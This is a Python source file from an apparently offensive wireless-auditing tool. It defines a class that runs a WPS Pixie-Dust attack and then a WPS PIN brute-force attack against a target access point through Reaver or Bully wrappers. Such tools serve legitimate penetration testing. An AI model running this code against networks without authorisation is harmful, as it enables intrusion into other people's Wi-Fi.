#!/usr/bin/python2.7
# -*- coding: utf-8 -*-

from Attack import Attack
from Airodump import Airodump
from Color import Color
from Configuration import Configuration
from CrackResultWPS import CrackResultWPS
from Process import Process
from Bully import Bully
from Reaver import Reaver

class AttackWPS(Attack):
    def __init__(self, target):
        super(AttackWPS, self).__init__(target)
        self.success = False
        self.crack_result = None

    def run(self):
        ''' Run all WPS-related attacks '''

        # Drop out if user specified to not use Reaver/Bully
        if Configuration.no_wps:
            self.success = False
            return self.success

        ###################
        # Pixie-Dust attack
        if Configuration.use_bully:
            # Bully: Pixie-dust
            bully = Bully(self.target, pixie=True)
            if bully.crack_result is not None:
                self.crack_result = bully.crack_result
                return True
        else:
            reaver = Reaver(self.target)
            if reaver.is_pixiedust_supported():
                # Reaver: Pixie-dust
                reaver = Reaver(self.target)
                if reaver.run_pixiedust_attack():
                    return True
            else:
                Color.pl("{!} {R}your version of 'reaver' does not support the {O}WPS pixie-dust attack{W}")

        if Configuration.pixie_only:
            Color.pl('\r{!} {O}--pixie{R} set, ignoring WPS-PIN attack{W}')
            return False

        ###################
        # PIN attack
        if Configuration.use_bully:
            # Bully: PIN guessing
            bully = Bully(self.target, pixie=False)
            if bully.crack_result is not None:
                self.crack_result = bully.crack_result
                return True
        else:
            # Reaver: PIN guessing
            reaver = Reaver(self.target)
            if reaver.run_wps_pin_attack():
                return True

        return False
